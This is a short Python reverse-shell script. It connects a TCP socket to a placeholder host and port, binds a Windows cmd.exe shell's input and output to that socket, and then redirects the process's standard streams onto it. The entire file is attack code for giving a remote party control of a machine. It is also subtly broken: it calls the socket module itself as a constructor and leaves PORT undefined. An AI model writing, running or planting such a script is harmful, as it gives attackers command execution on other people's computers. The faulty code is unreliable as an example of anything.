import socket as sock
import subprocess as sub
import os

def main():
    s = sock(sock.AF_INET, sock.SOCK_STREAM)
    s.connect(("IP", PORT))
    
    sub.Popen(["cmd.exe", "/c", "start"], shell=True, stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(), close_fds=True)


    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    

    sub.call(["cmd.exe", "/c", "start"])

if __name__ == "__main__":
    main()